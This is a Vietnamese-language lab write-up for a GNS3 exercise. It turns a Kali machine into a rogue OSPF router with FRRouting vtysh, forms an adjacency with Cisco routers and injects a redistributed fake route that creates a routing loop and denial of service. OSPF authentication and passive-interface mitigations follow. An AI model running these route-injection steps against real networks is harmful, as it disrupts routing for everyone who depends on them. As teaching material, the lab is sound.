# 🕸️ Lab: OSPF Route Injection & Routing Loop Attack (FRRouting/vtysh)

## 🎯 Mục tiêu bài Lab
Bài lab này mô phỏng cuộc tấn công vào giao thức định tuyến OSPF bằng cách biến máy của kẻ tấn công (Kali Linux) thành một Rogue Router (Router giả mạo). Thông qua bộ công cụ FRRouting (`vtysh`), kẻ tấn công sẽ:
1. Thiết lập quan hệ láng giềng (Adjacency) hợp lệ với các Router Cisco thật trong mạng.
2. Tiêm (Inject) một tuyến đường giả mạo trỏ đến một mạng ở xa (Remote Network).
3. Đánh lừa các Client chung mạng gửi dữ liệu về phía máy tấn công. Kết hợp với việc cấu hình sai lệch, kẻ tấn công sẽ tạo ra một vòng lặp định tuyến (Routing Loop) khiến dữ liệu chạy vòng vòng cho đến khi hết TTL (Time-to-Live), gây ra tình trạng Từ chối dịch vụ (DoS).

## ⚙️ Môi trường & Công cụ
* **Nền tảng:** GNS3
* **Thiết bị:** Cisco Routers (chạy OSPF), VPC (Client)
* **Máy tấn công:** Kali Linux (Yêu cầu cài đặt FRRouting hoặc Quagga)
* **Công cụ:** `vtysh`, `tcpdump`/Wireshark, `traceroute`

## 🚀 Kịch bản tấn công (Attack Scenario)

### Bước 1: Khởi động dịch vụ FRRouting trên Kali Linux
Đảm bảo rằng tính năng chuyển tiếp gói tin (IP Forwarding) đã được bật và dịch vụ định tuyến FRR đang chạy.
```bash
# Bật IP Forwarding để cho phép Kali định tuyến các gói tin
sysctl -w net.ipv4.ip_forward=1

# Khởi động dịch vụ FRRouting
systemctl start frr
```

### Bước 2: Truy cập vtysh và thiết lập Adjacency
Sử dụng shell `vtysh` để cấu hình Kali hoạt động như một Router OSPF và kết nối với Router Cisco hợp lệ. Giả sử mạng kết nối giữa Kali và Router thật là `192.168.1.0/24`, thuộc Area 0.
```bash
vtysh
# Chuyển sang chế độ cấu hình
Kali-Router# configure terminal

# Cấu hình tiến trình OSPF
Kali-Router(config)# router ospf
Kali-Router(config-router)# network 192.168.1.0/24 area 0
Kali-Router(config-router)# exit
```
*Lúc này, trên Router Cisco, bạn có thể gõ lệnh `show ip ospf neighbor` và sẽ mạng giả được định tuyến qua máy Kali (attacker).*

### Bước 3: Tiêm (Inject) Fake Route để tạo vòng lặp
Giả sử có một đường mạng xa mục tiêu là `10.10.10.0/24`. Kẻ tấn công sẽ tạo một route tĩnh giả mạo đẩy traffic của mạng này về lại Router thật (hoặc một cổng không tồn tại), sau đó phân phối (redistribute) nó vào OSPF.
```bash
# Tạo một route tĩnh giả mạo trỏ về mạng xa (Ví dụ trỏ ngược lại IP của Router thật là 192.168.1.1)
Kali-Router(config)# ip route 10.10.10.0/24 192.168.1.1

# Phân phối route giả này vào trong OSPF dưới dạng Type 5 LSA (External Route)
Kali-Router(config)# router ospf
Kali-Router(config-router)# redistribute static
Kali-Router(config-router)# exit
Kali-Router(config)# exit
Kali-Router# write
```

### Bước 4: Kiểm tra và Quan sát (Routing Loop)
1. **Trên Client (VPC):** Thực hiện lệnh `ping 10.10.10.1` hoặc `trace 10.10.10.1`.
2. **Hiện tượng:** 
   * Client gửi gói tin đến Default Gateway (Router thật).
   * Router thật nhìn vào bảng định tuyến OSPF, thấy máy Kali có đường đi "tốt hơn" đến `10.10.10.0/24`, nên đẩy gói tin sang máy Kali.
   * Máy Kali nhận được gói tin, nhìn vào bảng định tuyến tĩnh giả mạo vừa tạo, lại đẩy gói tin ngược về Router thật (`192.168.1.1`).
   * Quá trình này lặp đi lặp lại tạo thành **Routing Loop** cho đến khi TTL của gói tin giảm về 0 và bị drop.

## 🛡️ Biện pháp phòng thủ (Mitigation)
Để ngăn chặn Rogue Router tham gia vào mạng OSPF, cần triển khai các lớp bảo mật:

1. **Bật xác thực OSPF (Authentication):**
   Yêu cầu tất cả các láng giềng phải có chung mật khẩu (Nên dùng HMAC-SHA hoặc MD5) mới được trao đổi bảng định tuyến.
   ```bash
   Router(config-if)# ip ospf message-digest-key 1 md5 [MẬT_KHẨU_MẠNH]
   Router(config-if)# ip ospf authentication message-digest
   ```

2. **Cấu hình Passive Interface:**
   Tuyệt đối không gửi gói tin OSPF Hello xuống các cổng LAN (nơi người dùng cuối hoặc kẻ tấn công có thể cắm máy tính vào).
   ```bash
   Router(config)# router ospf 1
   Router(config-router)# passive-interface default
   Router(config-router)# no passive-interface [Cổng_Trunk_Nối_Với_Router_Khác]
   ```

---
*Project by Nguyen Gia Bao (Hoa Bảo Lục) - 2026*